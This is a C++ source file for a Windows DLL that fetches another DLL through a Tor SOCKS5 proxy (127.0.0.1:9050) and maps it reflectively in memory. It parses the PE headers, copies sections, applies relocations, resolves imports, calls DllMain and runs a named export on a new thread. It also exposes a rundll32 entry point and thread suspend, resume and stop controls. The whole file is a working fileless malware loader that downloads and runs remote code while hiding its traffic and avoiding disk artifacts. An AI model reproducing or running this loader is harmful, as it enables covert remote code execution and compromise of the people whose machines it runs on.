#include <winsock2.h>     // MUST be first before windows.h
#include <ws2tcpip.h>     // optional, for inet_pton, getaddrinfo, etc.
#include <windows.h>      // main Windows API
#include <string>
#include <vector>
#include <algorithm>      // for std::search
#include <fstream>

#pragma comment(lib, "ws2_32.lib")

//cl /LD mapper.cpp

static unsigned char* dllcode = nullptr;
static size_t dllsize = 0;


bool download_through_socks5(const char* proxy_ip, int proxy_port,
    const char* host, int port,
    const char* path)
{
    WSADATA w{};
    if (WSAStartup(MAKEWORD(2, 2), &w) != 0) return false;

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { WSACleanup(); return false; }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)proxy_port);
    if (inet_pton(AF_INET, proxy_ip, &addr.sin_addr) != 1) {
        closesocket(s); WSACleanup(); return false;
    }

    if (connect(s, (sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(s); WSACleanup(); return false;
    }

    // SOCKS5 greeting (no auth)
    unsigned char greet[3] = { 0x05, 0x01, 0x00 };
    if (send(s, (const char*)greet, 3, 0) != 3) { closesocket(s); WSACleanup(); return false; }

    unsigned char resp[2] = { 0 };
    if (recv(s, (char*)resp, 2, 0) != 2) { closesocket(s); WSACleanup(); return false; }
    if (resp[1] != 0x00) { closesocket(s); WSACleanup(); return false; }

    // Build CONNECT request (domain)
    std::string hostStr(host);
    std::vector<unsigned char> req;
    req.push_back(0x05); // ver
    req.push_back(0x01); // CONNECT
    req.push_back(0x00); // rsv
    req.push_back(0x03); // domain
    req.push_back((unsigned char)hostStr.size());
    req.insert(req.end(), hostStr.begin(), hostStr.end());
    req.push_back((unsigned char)((port >> 8) & 0xFF));
    req.push_back((unsigned char)(port & 0xFF));

    if (send(s, (const char*)req.data(), (int)req.size(), 0) != (int)req.size()) { closesocket(s); WSACleanup(); return false; }

    unsigned char reply[10];
    if (recv(s, (char*)reply, (int)sizeof(reply), 0) <= 1) { closesocket(s); WSACleanup(); return false; }
    if (reply[1] != 0x00) { closesocket(s); WSACleanup(); return false; }

    // HTTP GET through tunnel
    std::string http = std::string("GET ") + path + " HTTP/1.1\r\nHost: " + hostStr + "\r\nConnection: close\r\n\r\n";
    if (send(s, http.c_str(), (int)http.size(), 0) != (int)http.size()) { closesocket(s); WSACleanup(); return false; }

    // Read all
    std::vector<unsigned char> data;
    unsigned char buf[4096];
    int r;
    while ((r = recv(s, (char*)buf, sizeof(buf), 0)) > 0) {
        data.insert(data.end(), buf, buf + r);
    }

    closesocket(s);
    WSACleanup();

    // Find header/body separator
    const std::string hdr = "\r\n\r\n";
    auto it = std::search(data.begin(), data.end(), hdr.begin(), hdr.end());
    if (it == data.end()) return false;

    size_t headerSize = (it - data.begin()) + hdr.size();
    size_t bodySize = data.size() - headerSize;

    // allocate static buffer
    dllsize = bodySize;
    dllcode = new unsigned char[dllsize];
    memcpy(dllcode, data.data() + headerSize, dllsize);

    return true;
}

HANDLE threadhandle;

extern "C" __declspec(dllexport) int WINAPI stop() {
    TerminateThread(threadhandle, 0);
    return 0;
}

extern "C" __declspec(dllexport) int WINAPI resume() {
    ResumeThread(threadhandle);
    return 0;
}

extern "C" __declspec(dllexport) int WINAPI suspend() {
    SuspendThread(threadhandle);
    return 0;
}


extern "C" __declspec(dllexport) int WINAPI main_func(char* injecturl_one, char* inecturl_two, char* main_func_name) {
    while (!download_through_socks5("127.0.0.1", 9050, injecturl_one, 80, inecturl_two))
    {
        Sleep(10000);
    }

    // Point hModule at the raw dll bytes so the loader will treat the blob as the "original image".
    HMODULE hModule = (HMODULE)dllcode;
    const SIZE_T dllBlobSize = dllsize;

    if (hModule == NULL) {
        return FALSE;
    }

    // Parse DOS/NT headers from the on-disk image (raw blob) to obtain sizes for allocation.
    PIMAGE_DOS_HEADER pDosHeaderOrig = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeaderOrig->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }
    PIMAGE_NT_HEADERS64 pNtHeadersOrig = (PIMAGE_NT_HEADERS64)((BYTE*)hModule + pDosHeaderOrig->e_lfanew);
    if (pNtHeadersOrig->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    BOOL is64BitOrig = (pNtHeadersOrig->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);
    if (!is64BitOrig) {
        return FALSE;
    }

    // Use orig headers only to allocate memory.
    SIZE_T imageSizeAlloc = (SIZE_T)pNtHeadersOrig->OptionalHeader.SizeOfImage;
    LPVOID preferredBaseAlloc = (LPVOID)(ULONG_PTR)pNtHeadersOrig->OptionalHeader.ImageBase;

    // Allocate memory for the image (same as before)
    LPVOID mem = VirtualAlloc(preferredBaseAlloc, imageSizeAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    BOOL usedPreferredBase = TRUE;
    if (mem == NULL) {
        mem = VirtualAlloc(NULL, imageSizeAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        usedPreferredBase = FALSE;
    }
    if (mem == NULL) {
        return FALSE; // allocation failed
    }

    // Copy headers (from original image in memory)
    SIZE_T headersSize = pNtHeadersOrig->OptionalHeader.SizeOfHeaders;
    memcpy(mem, hModule, headersSize);

    // Re-parse headers from the copied image (mem) and use these for all further validation/operations.
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)mem;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
    PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)mem + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }

    SIZE_T imageSize = (SIZE_T)pNtHeaders->OptionalHeader.SizeOfImage;
    DWORD entryPointRVA = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    IMAGE_DATA_DIRECTORY* dataDir = pNtHeaders->OptionalHeader.DataDirectory;

    // Helper to validate that a pointer/region resides entirely inside the copied image.
    auto in_image = [&](BYTE* p, SIZE_T sz = 1)->bool {
        if (!mem) return false;
        BYTE* base = (BYTE*)mem;
        BYTE* end = base + imageSize;
        if (p < base) return false;
        if (sz == 0) return (p <= end);
        // check overflow
        if (p + (sz - 1) < p) return false;
        return (p + sz) <= end;
        };

    // Section table from the copied image
    WORD numSections = pNtHeaders->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(pNtHeaders);

    // original image bounds (as observed in the process where the loader runs)
    BYTE* origBase = (BYTE*)hModule;               // points into the raw blob (file layout)
    SIZE_T origImageSize = (SIZE_T)pNtHeadersOrig->OptionalHeader.SizeOfImage; // virtual size requested
    BYTE* origEnd = origBase + origImageSize;     // not safe for file-layout blobs
    // raw blob end is the actual buffer length
    BYTE* origBlobEnd = origBase + dllBlobSize;

    // Decide if the downloaded blob is a file-image (raw on-disk) or an in-memory mapped image
    // If the raw blob is smaller than the reported SizeOfImage it's almost certainly a file-layout blob.
    bool blobLooksLikeFileLayout = (dllBlobSize < origImageSize);
    if (blobLooksLikeFileLayout) {

    }
    else {

    }

    // Copy sections: when we have a file-layout blob, use PointerToRawData as source; otherwise prefer VA-located data.
    for (WORD i = 0; i < numSections; ++i) {
        DWORD virtRVA = sections[i].VirtualAddress;
        DWORD rawSize = sections[i].SizeOfRawData;
        DWORD virtSize = sections[i].Misc.VirtualSize;
        DWORD pointerToRaw = sections[i].PointerToRawData;
        BYTE* dest = (BYTE*)mem + virtRVA;

        // Validate dest region fits in allocated image
        if (!in_image(dest, virtSize)) {
            char dbg[128];
            _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "Section %u destination out-of-bounds: dest=%p virtSize=0x%X", i, dest, virtSize);
            continue;
        }

        SIZE_T copySize = (virtSize < rawSize) ? (SIZE_T)virtSize : (SIZE_T)rawSize;

        BYTE* srcFromVA = origBase + virtRVA;            // candidate if blob is mapped image
        BYTE* srcFromRaw = origBase + pointerToRaw;      // candidate if blob is file/image on disk

        bool copied = false;

        if (blobLooksLikeFileLayout) {
            // prefer raw PointerToRawData source when the blob is file-layout
            if (pointerToRaw != 0 && pointerToRaw + copySize <= dllBlobSize) {
                memcpy(dest, srcFromRaw, copySize);
                copied = true;
            }
            else {
                // fallback: if VA-based source is inside blob (rare) use it
                if ((srcFromVA >= origBase) && ((srcFromVA + copySize) <= origBlobEnd)) {
                    memcpy(dest, srcFromVA, copySize);
                    copied = true;
                }
            }
        }
        else {
            // blob likely mapped image: prefer VA data
            if ((srcFromVA >= origBase) && ((srcFromVA + copySize) <= origBlobEnd)) {
                memcpy(dest, srcFromVA, copySize);
                copied = true;
            }
            else if (pointerToRaw != 0 && (pointerToRaw + copySize) <= dllBlobSize) {
                memcpy(dest, srcFromRaw, copySize);
                copied = true;
            }
        }

        if (!copied && copySize > 0) {
            // no valid source inside blob -> zero out raw area (safe fallback)
            memset(dest, 0, copySize);
        }

        // Zero any remaining virtual bytes
        if (virtSize > copySize) {
            memset(dest + copySize, 0, virtSize - copySize);
        }

        // Debug info for each section copy
        char dbg[256];
        _snprintf_s(dbg, sizeof(dbg), _TRUNCATE,
            "Section %u: VA=0x%08X Raw=0x%X Virt=0x%X PtrToRaw=0x%08X copied=%d copySize=0x%Ix",
            i, virtRVA, rawSize, virtSize, pointerToRaw, (int)copied, copySize);
    }

    // Continue with relocations/imports/exports as before (not fully changed here)
    INT64 offsetDelta = (INT64)((BYTE*)mem - (BYTE*)preferredBaseAlloc);

    // Relocations
    if (!usedPreferredBase) {
        if (dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 &&
            dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size != 0)
        {
            BYTE* relocBase = (BYTE*)mem + dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
            DWORD relocSize = dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            if (in_image(relocBase, relocSize)) {
                BYTE* relocEnd = relocBase + relocSize;
                while (relocBase < relocEnd) {
                    if (!in_image(relocBase, sizeof(IMAGE_BASE_RELOCATION))) break;
                    IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)relocBase;
                    DWORD pageRVA = block->VirtualAddress;
                    DWORD blockSize = block->SizeOfBlock;
                    if (blockSize < sizeof(IMAGE_BASE_RELOCATION)) break;
                    BYTE* entriesBase = relocBase + sizeof(IMAGE_BASE_RELOCATION);
                    DWORD entriesBytes = blockSize - sizeof(IMAGE_BASE_RELOCATION);
                    if (!in_image(entriesBase, entriesBytes)) break;
                    WORD* entries = (WORD*)(entriesBase);
                    size_t entryCount = entriesBytes / sizeof(WORD);
                    for (size_t i = 0; i < entryCount; ++i) {
                        WORD entry = entries[i];
                        WORD type = entry >> 12;
                        WORD offset = entry & 0x0FFF;
                        BYTE* target = (BYTE*)mem + pageRVA + offset;
                        if (!in_image(target, (type == IMAGE_REL_BASED_DIR64) ? sizeof(INT64) : sizeof(DWORD))) {
                            continue; // skip out-of-bounds reloc
                        }
                        if (type == IMAGE_REL_BASED_HIGHLOW) {
                            continue;
                        }
                        else if (type == IMAGE_REL_BASED_DIR64) {
                            INT64* p = (INT64*)target;
                            *p += offsetDelta;
                        }
                    }
                    relocBase += blockSize;
                }
            }
        }
    }

    using MainFuncType = DWORD(WINAPI*)(LPVOID lpParameter);
    MainFuncType main_func = nullptr;

    // Export table handling (same as prior code - keep bounds checking)
    if (dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0 &&
        dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size != 0)
    {
        IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mem + dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        if (in_image((BYTE*)exp, sizeof(IMAGE_EXPORT_DIRECTORY))) {
            DWORD numberOfNames = exp->NumberOfNames;
            DWORD numberOfFunctions = exp->NumberOfFunctions;
            DWORD exportDirSize = dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

            char dbg2[256];
            _snprintf_s(dbg2, sizeof(dbg2), _TRUNCATE,
                "ExportDir AddrOfFunctions=0x%X DirSize=0x%X #Names=%u #Funcs=%u",
                exp->AddressOfFunctions, exportDirSize, exp->NumberOfNames, exp->NumberOfFunctions);

            DWORD* funcRVAs = nullptr;
            DWORD* nameRVAs = nullptr;
            WORD* ords = nullptr;

            if (exp->AddressOfFunctions != 0) funcRVAs = (DWORD*)((BYTE*)mem + exp->AddressOfFunctions);
            if (exp->AddressOfNames != 0) nameRVAs = (DWORD*)((BYTE*)mem + exp->AddressOfNames);
            if (exp->AddressOfNameOrdinals != 0) ords = (WORD*)((BYTE*)mem + exp->AddressOfNameOrdinals);

            bool arrays_ok = true;
            if (funcRVAs == nullptr || nameRVAs == nullptr || ords == nullptr) arrays_ok = false;
            else {
                if (!in_image((BYTE*)funcRVAs, sizeof(DWORD) * (size_t)numberOfFunctions)) arrays_ok = false;
                if (!in_image((BYTE*)nameRVAs, sizeof(DWORD) * (size_t)numberOfNames)) arrays_ok = false;
                if (!in_image((BYTE*)ords, sizeof(WORD) * (size_t)numberOfNames)) arrays_ok = false;
            }

            if (arrays_ok) {
                char dbg[256];
                for (DWORD i = 0; i < numberOfNames; ++i) {
                    DWORD nameRVA = nameRVAs[i];
                    if (!in_image((BYTE*)mem + nameRVA, 1)) continue;
                    BYTE* namePtr = (BYTE*)mem + nameRVA;
                    size_t maxLen = (BYTE*)mem + imageSize - namePtr;
                    std::string nameStr((const char*)namePtr, strnlen_s((const char*)namePtr, maxLen));
                    _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "Export #%u name: '%s'", i, nameStr.c_str());

                    if (nameStr == main_func_name) {
                        WORD funcIndex = ords[i];
                        _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "funcIndex=%u (must be < %u)", funcIndex, numberOfFunctions);
                        if (funcIndex >= numberOfFunctions) {
                            continue;
                        }
                        DWORD funcRVA = funcRVAs[funcIndex];
                        BYTE* funcVA = (BYTE*)mem + funcRVA;
                        _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "funcRVA=0x%08X funcVA=%p in_image=%d", funcRVA, funcVA, in_image(funcVA, 1));
                        if (!in_image(funcVA, 1)) { continue; }

                        main_func = (MainFuncType)(funcVA);
                    }
                }
            }
            else {
            }
        }
    }

    // (imports, protections, entry point call etc. unchanged from earlier sample)

    // Resolve imports safely: validate import directory and all computed pointers
    if (dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress != 0 &&
        dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].Size != 0)
    {
        BYTE* importBase = (BYTE*)mem + dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        DWORD importSize = dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
        if (in_image(importBase, 1) && in_image(importBase, importSize)) {
            IMAGE_IMPORT_DESCRIPTOR* impDesc = (IMAGE_IMPORT_DESCRIPTOR*)importBase;
            // iterate descriptors until a null descriptor or out-of-bounds
            while (in_image((BYTE*)impDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && impDesc->Name != 0) {
                // validate dll name pointer
                BYTE* dllNamePtr = (BYTE*)mem + impDesc->Name;
                if (!in_image(dllNamePtr, 1)) {
                    ++impDesc;
                    continue;
                }
                const char* dllName = (const char*)dllNamePtr;
                HMODULE hMod = LoadLibraryA(dllName);
                if (!hMod) {
                    // skip unresolved library but continue processing remaining descriptors
                    ++impDesc;
                    continue;
                }

                // Use OriginalFirstThunk if present, otherwise fall back to FirstThunk
                DWORD origRVA = impDesc->OriginalFirstThunk;
                DWORD iatRVA = impDesc->FirstThunk;
                if (iatRVA == 0) { ++impDesc; continue; } // nothing to do

                IMAGE_THUNK_DATA64* origThunk = (IMAGE_THUNK_DATA64*)((BYTE*)mem + (origRVA ? origRVA : iatRVA));
                IMAGE_THUNK_DATA64* iatThunk = (IMAGE_THUNK_DATA64*)((BYTE*)mem + iatRVA);

                // Validate thunk pointers lie inside the image
                if (!in_image((BYTE*)origThunk, sizeof(IMAGE_THUNK_DATA64)) ||
                    !in_image((BYTE*)iatThunk, sizeof(IMAGE_THUNK_DATA64)))
                {
                    ++impDesc;
                    continue;
                }

                // Iterate thunk entries with bounds checks
                while (in_image((BYTE*)origThunk, sizeof(IMAGE_THUNK_DATA64)) &&
                    in_image((BYTE*)iatThunk, sizeof(IMAGE_THUNK_DATA64)) &&
                    origThunk->u1.AddressOfData != 0)
                {
                    FARPROC func = nullptr;
                    if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                        WORD ord = (WORD)(origThunk->u1.Ordinal & 0xFFFF);
                        func = GetProcAddress(hMod, (LPCSTR)(uintptr_t)ord);
                    }
                    else {
                        // IMAGE_IMPORT_BY_NAME structure
                        IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)((BYTE*)mem + origThunk->u1.AddressOfData);
                        if (!in_image((BYTE*)ibn, sizeof(WORD) + 1) || !in_image((BYTE*)ibn->Name, 1)) {
                            // invalid or truncated import by name; stop this thunk chain
                            break;
                        }
                        // Ensure the name is null-terminated before passing to GetProcAddress.
                        // We can't easily know the full length safely, so check that the start is inside the image.
                        func = GetProcAddress(hMod, (LPCSTR)ibn->Name);
                    }

                    // Only patch if func resolved
                    if (func) {
                        iatThunk->u1.Function = (ULONGLONG)func;
                    }
                    else {
                        // handle unresolved export (set to NULL)
                        iatThunk->u1.Function = 0;
                    }

                    ++origThunk;
                    ++iatThunk;
                }

                ++impDesc;
            }
        }
    }

    // Set memory protections for sections (validated)
    for (WORD i = 0; i < numSections; ++i) {
        BYTE* dest = (BYTE*)mem + sections[i].VirtualAddress;
        DWORD size = sections[i].Misc.VirtualSize;
        if (!in_image(dest, size)) continue; // skip invalid region

        DWORD oldProtect = 0;
        DWORD protect = 0;
        BOOL isExecutable = (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL isReadable = (sections[i].Characteristics & IMAGE_SCN_MEM_READ) != 0;
        BOOL isWritable = (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
        if (isExecutable) {
            if (isReadable) {
                if (isWritable) {
                    protect = PAGE_EXECUTE_READWRITE;
                }
                else {
                    protect = PAGE_EXECUTE_READ;
                }
            }
            else {
                if (isWritable) {
                    protect = PAGE_EXECUTE_WRITECOPY;
                }
                else {
                }
            }
        }
        else {
            protect = PAGE_EXECUTE;

            if (isReadable) {
                if (isWritable) {
                    protect = PAGE_READWRITE;
                }
                else {
                    protect = PAGE_READONLY;
                }
            }
            else {
                if (isWritable) {
                    protect = PAGE_WRITECOPY;
                }
                else {
                    protect = PAGE_NOACCESS;
                }
            }
        }
        VirtualProtect(dest, size, protect, &oldProtect);
    }
    // Call the entry point (validate entry point RVA against the copied image)
    if (entryPointRVA != 0)
    {
        BYTE* entryPtr = (BYTE*)mem + entryPointRVA;

        // sanity check — make sure entrypoint is inside manually mapped image
        if (in_image(entryPtr, 1))
        {
            // The entrypoint of a DLL follows the DllMain prototype:
            // BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
            using DllMainFunc = BOOL (WINAPI*)(HINSTANCE, DWORD, LPVOID);

            DllMainFunc dllMain = (DllMainFunc)entryPtr;

            dllMain((HINSTANCE)mem, DLL_PROCESS_ATTACH, nullptr);
        }
    }


    if (main_func) {
        FlushInstructionCache(GetCurrentProcess(), mem, imageSize);

        threadhandle = CreateThread(
            nullptr,
            0,
            (LPTHREAD_START_ROUTINE)main_func,
            nullptr,
            0,
            nullptr
        );

        if (threadhandle) {
            WaitForSingleObject(threadhandle, INFINITE); // wait for completion
            CloseHandle(threadhandle);
        }
    }

    return TRUE;
}

static std::vector<std::string> SplitArgs(const std::string& cmd) {
    std::vector<std::string> args;
    std::string current;
    bool inQuotes = false;

    for (char c : cmd) {
        if (c == '"') {
            inQuotes = !inQuotes;
        } else if (!inQuotes && c == ' ') {
            if (!current.empty()) {
                args.push_back(current);
                current.clear();
            }
        } else {
            current.push_back(c);
        }
    }
    if (!current.empty()) {
        args.push_back(current);
    }
    return args;
}

// This is the wrapper that rundll32.exe can call
extern "C" __declspec(dllexport)
void CALLBACK rundll_main(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    std::string cmd(lpszCmdLine ? lpszCmdLine : "");

    // Parse the parameters (space-separated, supports quotes)
    auto parts = SplitArgs(cmd);

    // We expect 3 parts:
    //   <injecturl_one> <injecturl_two> <main_func_name>
    // You could accept more or fewer if desired.

    const char* arg1 = nullptr;
    const char* arg2 = nullptr;
    const char* arg3 = nullptr;

    if (parts.size() > 0) arg1 = parts[0].c_str();
    if (parts.size() > 1) arg2 = parts[1].c_str();
    if (parts.size() > 2) arg3 = parts[2].c_str();

    // Call the original function
    // (If some args are missing, pass nullptrs)
    main_func((char*)arg1, (char*)arg2, (char*)arg3);
}



BOOL APIENTRY DllMain(HMODULE hModuleCall,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}